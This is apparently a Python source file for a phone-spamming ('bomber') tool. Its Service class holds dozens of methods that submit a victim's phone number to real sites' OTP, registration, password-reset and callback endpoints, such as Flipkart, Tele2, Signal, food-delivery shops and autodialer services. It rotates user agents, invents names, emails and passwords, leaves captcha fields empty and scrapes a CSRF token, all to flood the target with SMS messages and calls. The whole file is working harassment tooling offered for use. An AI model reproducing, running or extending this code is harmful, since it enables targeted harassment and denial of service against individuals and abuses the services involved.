import json, requests
from bs4 import BeautifulSoup as bs
from random import randint
from data import *


data_headers={"X-Requested-With": "XMLHttpRequest",
"Connection": "keep-alive",
"Pragma": "no-cache",
"Cache-Control": "no-cache",
"Accept-Encoding": "gzip, deflate, br",
'User-Agent':user_agent(), 'DNT':'1'}

def phone_mask(phone, maska):
    str_list = list(phone)
    for xxx in str_list:
        maska=maska.replace("#", xxx, 1)
    return maska

class Service():
    def __init__(self):
        self.start = True

    def number(self, number_phone):
        self.phone = number_phone
        if self.phone[0] == '+':
            self.phone_not_pluse = str(number_phone[1:])
            self.phone_mask = str(phone_mask(phone=self.phone_not_pluse, maska="+# (###) ###-##-##"))

            if self.phone[1] == '3':
                self.country_code = '380'

            elif self.phone[1] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[1] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[1])+str(self.phone[2])

        elif isinstance(int(self.phone), int):
            self.phone_not_pluse = str(number_phone)
            self.phone_mask = str(phone_mask(phone=number_phone, maska="+# (###) ###-##-##"))

            if self.phone[0] == '3':
                self.country_code = '380'

            elif self.phone[0] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[0] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[0])+str(self.phone[1])
            self.phone = '+'+str(number_phone)

    def dgtl(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://i-dgtl.ru/curl/flashcall.php",
            data={
                "check": "",
                "flashcall-code": randint(1000, 9999),
                "flashcall-tel": self.phone,
            },headers=headers_copy)
        requests.post(
            "https://i-dgtl.ru/curl/sms.php",
            data={"check": "", "flashcall-tel": self.phone},headers=headers_copy)

    def flipkart(self):
        agent = user_agent()
        requests.post(
            "https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            data={"loginId": self.phone}
        )

        requests.post(
            "https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            json={"loginId": self.phone, "supportAllStates": True})

    def foodband(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://foodband.ru/api?call=calls",
            data={
                "customerName": _ru_name_(),
                "phone": self.phone_mask,
                "g-recaptcha-response": "",
            },headers=headers_copy)

        requests.get(
            "https://foodband.ru/api/",
            params={
                "call": "customers/sendVerificationCode",
                "phone": self.phone,
                "g-recaptcha-response": "",
            },headers=headers_copy)

    def makimaki(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://makimaki.ru/system/callback.php",
            params={
                "cb_fio": _ru_name_(),
                "cb_phone": phone_mask(self.phone_not_pluse, "+# ### ### ## ##")
            },headers=headers_copy)

    def mngogomenu(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f"http://mnogomenu.ru/office/password/reset/{self.phone_mask}",headers=headers_copy)
        requests.post('http://mnogomenu.ru/ajax/callback/send', data={f'uname':{name()},'uphone':f'{phone_mask(phone=self.phone_not_pluse, maska="+#(###)+###+##+##")}'},
        headers=headers_copy)

    def nncard(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://nn-card.ru/api/1.0/register",
            json={"phone": self.phone, "password": password()},headers=headers_copy)

    def okean(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://okeansushi.ru/includes/contact.php",
            params={
                "call_mail": "1",
                "ajax": "1",
                "name": _ru_name_(),
                "phone": self.phone,
                "call_time": "1",
                "pravila2": "on",
            },headers=headers_copy)

        requests.get(
            "https://sso.cloud.qlean.ru/http/users/requestotp",
            headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
            params={
                "phone": self.phone,
                "clientId": "undefined",
                "sessionId": str(randint(5000, 9999)),
            })


    def rbt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.rbt.ru/user/sendCode/",
            data={"phone": self.phone_mask}, headers=headers_copy)

    def rendesvouz(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.rendez-vous.ru/callback/create/",
            data={'input_for_spam':'Callback','name':name(),
            'phone':phone_mask(self.phone_not_pluse, "+#(###)###-##-##"),
            'ajax':'callback-form', 'yt2':'Отправить заявку'
            },headers=headers_copy)

    def signalis(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://deathstar.signal.is/auth",
            data={"phone": self.phone},headers=headers_copy)

    def sipnet(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
            params={"oper": 9, "callmode": 1, "phone": self.phone},headers=headers_copy)

    def suandi(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://suandshi.ru/mobile_api/register_mobile_user",
            params={"phone": self.phone},headers=headers_copy)

    def sunlignt(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://api.sunlight.net/v3/customers/authorization/",
        data={"phone": self.phone_not_pluse},headers=headers_copy)

    def pizza_33(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": email(),
                "password": password(),
                "phone": self.phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },headers=headers_copy)

    def sumaster(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://client-api.sushi-master.ru/api/v1/auth/init",
            json={"phone": self.phone},headers=headers_copy)

    def sushiprof(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.sushi-profi.ru/api/order/order-call/",
            json={"phone": self.phone, "name": _ru_name_()},
            headers=headers_copy)

    def tarantionofamely(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
            data={"action": "callback_phonenumber", "phone": self.phone},
            headers=headers_copy)

    def taziritm(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": self.phone},
            headers=headers_copy)

    def tele2(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://msk.tele2.ru/api/validation/number/" + self.phone,
            json={"sender": "Tele2"},
            headers=headers_copy)

    def e_vse(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://e-vse.online/mail2.php", data={'object':'callback','user_name': name(),'contact_phone':self.phone},
        headers=headers_copy)

    def cleversite(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://clients.cleversite.ru/callback/run.php",
            data={
                "siteid": "62731",
                "num": self.phone,
                "title": "Онлайн-консультант",
                "referrer": "https://m.cleversite.ru/call",
            },headers=headers_copy)

    def callmyphone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://callmyphone.org/do-call",
            data={"phone": self.phone, "browser": "undefined"},
            headers=headers_copy)

    def avtobzvon(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
        "https://avtobzvon.ru/request/makeTestCall",
        params={"to": phone_mask(self.phone_not_pluse[1:], "(###) ###-##-##")},
        headers=headers_copy)

    def syzran(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://syzran.farfor.ru/callback/',
        data={"csrfmiddlewaretoken":'vWG9OCe8dXY2RqsiaxLdnnNEHcUkfoq7Pb8QkkYjjNlL0nNCtf9ovoMTXnE7M3DY', "phone":phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')}, headers=headers_copy)

    def remontnik(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.remontnik.ru/api/v2/register/step_10/',
        json={"name":_ru_name_(),"email":email(),"phone":self.phone_not_pluse,"social":"false","time_zone":-180,"screen_size":"2048×1080x24","system_fonts":"Arial, Arial Narrow, Bitstream Vera Sans Mono, Bookman Old Style, Century Schoolbook, Courier, Courier New, Helvetica, Palatino, Palatino Linotype, Times, Times New Roman",
        "supercookie":"DOM localStorage, DOM sessionStorage"}, headers=headers_copy)

    def findclone(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://findclone.ru/register?phone={self.phone}', headers=headers_copy)

    def farmakopeika(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://farmakopeika.ru/local/ajax/forms/re_call_form.php',data={'WEB_FORM_ID':1, 'sessid':'47ea89r6ca1b105894td0eea3a4e5f0g', 'phone':self.phone_not_pluse[1:], 'name':name()}, headers=headers_copy)

    def farmacia24(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f'https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}', headers=headers_copy)

    def autodozvon(self):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post('https://autodozvon.ru/test/makeTestCall', headers=headers_copy, params = {'to': phone_mask(self.phone_not_pluse[1:], "(###) ##-##-##)")})

    def apteka_one(self):
        try:
            auth_html = requests.get('https://apteka38plus.ru/register')
            auth_bs = bs(auth_html.content, 'html.parser')
            token = auth_bs.select('meta[name=csrf-token]')[0]['content']
            for i in range(2):
                requests.post('https://apteka38plus.ru/register/confirm',data={'_token': token, 'name': _ru_name_(),
                            'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
                             'email': email(), 'password': password(), 'password_confirmation': password(),
                             'redirect_to': 'https://apteka38plus.ru/verify', 'notify_offers': 'on'})
        except:
            pass

#
